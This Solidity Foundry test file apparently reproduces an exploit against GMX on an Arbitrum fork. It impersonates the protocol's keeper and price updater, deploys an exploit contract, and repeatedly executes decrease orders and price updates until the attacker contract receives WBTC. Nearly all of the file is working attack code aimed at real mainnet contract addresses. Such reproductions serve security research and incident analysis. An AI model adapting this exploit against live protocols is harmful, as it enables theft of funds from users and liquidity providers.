// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IWETH9} from "../../interfaces/IWETH9.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IPositionManager} from "./IPositionManager.sol";
import {ExploitSC} from "./ExploitSC.sol";
import {IOrderBook} from "./IOrderBook.sol";

import {IFastPriceFeed} from "./IFastPriceFeed.sol";

//Contract deployed in arbitrum block 355876960
contract Exploit_GMX is TestHarness, TokenBalanceTracker{

    IWETH9 internal constant WETH = IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IERC20 internal constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 internal constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);

    address internal constant USDC_WHALE = 0xf89d7b9c864f589bbF53a82105107622B35EaA40;

    address internal constant KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;
    address internal constant UPDATER = 0x2BcD0d9Dde4bD69C516Af4eBd3fB7173e1FA12d0;

    ExploitSC internal exploitSC;

    IPositionManager internal constant POSITION_MANAGER = IPositionManager(0x75E42e6f01baf1D6022bEa862A28774a9f8a4A0C);

    IOrderBook internal constant ORDER_BOOK = IOrderBook(0x09f77E8A13De9a35a7231028187e9fD5DB8a2ACB);

    IFastPriceFeed internal constant FAST_PRICE_FEED = IFastPriceFeed(0x11D62807dAE812a0F1571243460Bf94325F43BB7);

    function setUp() external {
        cheat.createSelectFork("arbitrum", 355876959);

        cheat.deal(address(this),0.8 ether);

        // This does not work. Probably need to update forge-std because token is behind a proxy
        //deal(address(USDC), address(this), 3001000000);
        vm.prank(USDC_WHALE);
        USDC.transfer(address(this), 3001000000);
    }

    function test_attack() external {
        // Deploy the exploit contract
        exploitSC = new ExploitSC();

        // Transfer USDC to the exploit contract
        USDC.transfer(address(exploitSC), 3001000000);

        // Just creates an increase order
        exploitSC.createIncreaseOrder{value: 0.2003 ether}();

        // Keepr executes increase order
        vm.prank(KEEPER);
        POSITION_MANAGER.executeIncreaseOrder(
            address(exploitSC), 
            0, // order index
            payable(KEEPER)
        );

        // Create a decrease order
        exploitSC.createDecreaseOrder{value: 0.0015 ether}();

        // Keeper executes decrease order and exploit contract executes logic to create a new decrease order in the eth transfer call
        uint256 wbtcBalance = WBTC.balanceOf(address(exploitSC));

        uint256 i = 0;
        while (wbtcBalance == 0){
            console2.log("Iteration", i);
            vm.prank(KEEPER);
            POSITION_MANAGER.executeDecreaseOrder(
                address(exploitSC), 
                i, 
                payable(KEEPER)
            );

            // Updater updates a price in the fast price feed
            // and triggers the execution of decrease orders, generating a call to the gmxPositionCallback in the exploit contract that creates a new decrease order
            vm.prank(UPDATER);
            FAST_PRICE_FEED.setPricesWithBitsAndExecute(
                650780127152856667663437440412910 + i,
                1752063940 + i,
                842256 + i,
                533458 + i,
                0,
                10001
            );
            wbtcBalance = WBTC.balanceOf(address(exploitSC));
            i++;
        }
    }
}